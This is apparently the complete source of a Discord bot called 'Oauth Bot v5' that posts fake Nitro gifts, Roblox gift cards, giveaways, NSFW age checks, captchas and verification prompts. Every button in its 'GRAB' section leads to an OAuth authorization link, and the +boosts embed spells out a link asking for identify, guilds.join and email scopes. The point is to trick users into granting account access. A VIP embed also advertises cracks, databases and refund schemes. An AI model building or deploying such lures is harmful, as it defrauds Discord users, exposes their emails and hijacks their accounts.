const { Collection, Client, Discord, MessageEmbed, Message, Intents } = require('discord.js');
const moment = require("moment")
require("moment-duration-format")
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
require('discord-buttons')(client);
const path = require('path')
const fs = require('fs')
let cpuStat = require("cpu-stat");
const discordbuttons = require('discord-buttons')
let os = require("os");
const { MessageButton, MessageActionRow, URL, ButtonBuilder, Link} = require("discord-buttons")
const { authlink } = require('./config');
client.prefix = "+"




    const activities = [
      "...",
      "+help | v5",
    ];

    client.on("ready", () => {
      // run every 10 seconds
      setInterval(() => {
        // generate random number between 1 and list length.
        const randomIndex = Math.floor(Math.random() * (activities.length - 1) + 1);
        const newActivity = activities[randomIndex];

        client.user.setActivity(newActivity);
      }, 20000);
    });

client.once('ready', () => {
    console.log(`\u001b[32m✔ \u001b[0mThe Server Is Online! 
\u001b[32m▣\u001b[0m \u001b[0mBot Connected: \u001b[34;1m${client.user.tag}
\u001b[32m▣\u001b[0m \u001b[0mBot Run By: \u001b[34;1mFelosi\u001b[0m`);
})

//----------------MAIN--------------------

client.on('message', async (message) => {
    if (message.content.startsWith('+help')) {
        const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(`**Oauth Bot v5**`)

        .setDescription (`🍁 ** Main Commands:**\n \`help\` \`stats\` \`renew\` \`github\` \`dashboard\`\n\n✨ ** Grab Commands:**\n \`nsfw\` \`gift\` \`nitroqr\` \`nitro1\` \`nitro2\` \`roblox\` \`verify\` \`giveaway\` \`boosts\` \`captcha\` \`ticket\`\n\n💎 ** Embed Commands:**\n\`event\` \`vip\` \`backup\``)
        .setFooter("Made by Felosi");
        message.channel.send({embed: embed })
    }
})



client.on('message', async (message) => {
    if (message.content.startsWith('+stats')) {
      cpuStat.usagePercent(function (e, percent, seconds) {
          if (e) {
              return console.log(String(e.stack).red);
          }
          const duration = moment.duration(client.uptime).format(" D [days], H [hrs], m [mins], s [secs]");

          let connectedchannelsamount = 0;
          let guilds = client.guilds.cache.map((guild) => guild);
          for (let i = 0; i < guilds.length; i++) {
              if (guilds[i].me.voice.channel) connectedchannelsamount += 1;
          }
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`**Stats:**`)

              .addField("⏳ Memory Usage", `\`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}/ ${(os.totalmem() / 1024 / 1024).toFixed(2)}MB\``, true)
              .addField("⌚️ Uptime ", `\`${duration}\``, true)
              .addField("📁 Users", `\`${client.users.cache.size}\``, true)
              .addField("🚀 Servers", `\`${client.guilds.cache.size}\``, true)
             .addField("⏰ API Latency", `\`${client.ws.ping}ms\``, true)
              .addField("🤖 CPU usage", `\`${percent.toFixed(2)}%\``, true);
        message.channel.send({embed: embed })
    }
   )}
})

client.on('message', async (message) => {
  if (message.content.startsWith('+renew')) {
      if (!message.member.hasPermission("MANAGE_CHANNELS")) {
          return message.channel.send("You don't have permissions to do this command!")

      }
      message.channel.clone().then
      ((ch) => {
          ch.setParent(message.channel.parent);
          ch.setPosition(message.channel.position);
          message.channel.delete().then(() => {
              ch.send("**Channel Nuked** \n https://imgur.com/LIyGeCR")
          })

      });
}
}
)

client.on("message", async (message) => {
  //if (message.author.bot) return;
  if (message.content.startsWith("+github")) {
    message.channel.send('https://github.com/Webscord/Oauth-Bot')
  }
})


client.on('message', async (message) => {
    if (message.content.startsWith('+dashboard')) {
        const embed = new MessageEmbed()
        .setDescription("**Your Dashboard**\nThere is currently `2` members in the bot!")
.setImage('https://i.gifer.com/J4o.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Go to dashboard")
            .setURL("https://restorecord.com/dashboard")
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})
//----------------EMBED-------------------


client.on('message', async(message) => {
    if (message.content.startsWith('+vip')) {
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`To have the Vip role:`)

        .setDescription(`
Techs / Refunds / Training / Cracks / Database / Tools / Osint

<a:a1:1250270783209734286> ・Boost the server 2x
Or
<a:a1:1250270783209734286> ・Invite 5 people to the server
Or
<a:a1:1250270783209734286> ・Pay €2.50 by PayPal

🎊 Open a [ticket](https://discord.com/channels/1250226429048655924/1250226429619343453) to negotiate, claim your invitations/boosts, to exchange techs or other.`)
        message.channel.send({embed: embed })
    }
})



client.on('message', async(message) => {
    if (message.content.startsWith('+backup')) {
        const embed = new MessageEmbed()
        .setTitle("Money2Make")
        .setDescription(`Press the Verification button so if something bad happens to the server you will be directly added to the new one. Please, it's really important!`)
.setImage('https://share.creavite.co/6668fcf6db2d31826fb8f675.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🔑 Verification")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})


client.on('message', async (message) => {
    if (message.content.startsWith('+event')) {
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`__**🎁 Prizes**__`)

        .setDescription (`・ Instant Claim ⚡️

・ 2 Invites = Nitro Boost Monthly / 1000 Robux

・ 5 Invites = Nitro Basic Yearly / 2500 Robux

・10 Invites = Nitro Boost Yearly / 5000 Robux


🎊 Are you out of invitations? Verify your invites in ⁠the invites channel and DM the Owner to claim your reward. `)
        .setImage("https://www.centralxbox.com.br/wp-content/uploads/2019/11/discord-nitro.jpg")
        message.channel.send({embed: embed })
    }
})

//----------------GRAB--------------------

client.on('message', async (message) => {
    if (message.content.startsWith('+nsfw')) {
        const embed = new MessageEmbed()
        .setTitle(`NSFW Verification`)
        .setDescription(`Click the emoji to confirm that you are 18 or older and consent to view sexual content.`)
.setImage('https://cdn.discordapp.com/attachments/945812190936584233/1089594308543393792/JqoLqSb_1.gif')
        .setColor("0")

        const z = new MessageButton()
            .setStyle("url")
            .setLabel("🔞")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([z])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on("message", async (message) => {
  //if (message.author.bot) return;
  if (message.content.startsWith("+nitroqr")) {
    message.channel.send('https://i.ibb.co/CHw9D4g/Cre-ation-sans-titre-2.png')
  }
})


client.on('message', async (message) => {
    if (message.content.startsWith('+nitro1')) {
        const embed = new MessageEmbed()
        .setDescription(`**You won a nitro classic click claim button to get!**`)
.setImage('https://i.ibb.co/h7YmKph/Nitro.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+nitro2')) {
        const embed = new MessageEmbed()
        .setDescription(`**You won a nitro boost click claim button to get!**`)
.setImage('https://i.ibb.co/W50Mxd2/Capture-d-e-cran-le-2024-06-11-a-21-39-31.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})



client.on("message", async (message) => {
  //if (message.author.bot) return;
  if (message.content.startsWith("+gift")) {
    let button = new MessageButton()
    .setStyle('url')
    .setURL(authlink)
    .setLabel('Claim');
    message.channel.send('https://earnit.gg/images/withdraw/discord/nitrogift.jpg',button)
  }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+boosts')) {
        const embed = new MessageEmbed()
        .setTitle("Hello everyone, you have all received 14x server boost for one month!")
        .setDescription(`To get your 14x server boost, all you need to do is:
   \n1️⃣ Click on the button [claim](https://discord.com/oauth2/authorize?client_id=1250223550535827549&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join+email&state=1250226429048655924).
   \n2️⃣ Click on the button [autorize](https://discord.com/oauth2/authorize?client_id=1250223550535827549&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join+email&state=1250226429048655924).\n\nOnce you get autorized you need to wait about 24-48 hours and you will get it.`)
.setImage('https://static1.makeuseofimages.com/wordpress/wp-content/uploads/2021/04/discord-server-boost-featured-image.jpg')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎁 Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})


client.on('message', async (message) => {
    if (message.content.startsWith('+giveaway')) {
        const embed = new MessageEmbed()
        .setTitle("**Nitro Boost 1 month 🎁** ")
        .setDescription(`\nWinners: \`1\`\nTimer: \`Ends in 2 hours\`\nHosted by: \`Unknown\` \n\n\n\n:tada: To enter the giveaway, click on the button below.`)
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎉 Enter")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+roblox')) {
        const embed = new MessageEmbed()
        .setTitle("**You won a $50 Roblox gift card click claim button to get!**")
.setImage('https://i.ibb.co/hHnDnS4/6459231-sd-Photoroom-1.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+verify')) {
        const embed = new MessageEmbed()
        .setTitle("Verification")
        .setDescription(`**Please click on the button to access the server!**`)
.setImage('https://upload.wikimedia.org/wikipedia/fr/9/9d/Captcha_google_checkbox.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Verify here")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+captcha')) {
        const embed = new MessageEmbed()
        .setTitle("**ℹ️ Welcome to [+] Protect!**")
        .setDescription(`In order to access the entire server, please click on the button and answer what you read in the image below (to verify that you are not a robot).`)
.setFooter("⚠️ The code consists of 5 letters/numbers.")
.setImage('https://www.learningsuccessblog.com/files/0aainput-black.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Respond")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+ticket')) {
        const embed = new MessageEmbed()
        .setTitle("Support")
        .setDescription(`To create a ticket react with 📩`)
.setFooter("[+] Protect - Ticketing without clutter")
.setImage('https://www.toulokowitz.fr/wp-content/uploads/2020/06/29966-1280x483.jpg')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("📩 Create ticket")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})


client.login(process.env.TOKEN);

//Made by Felosi @2024
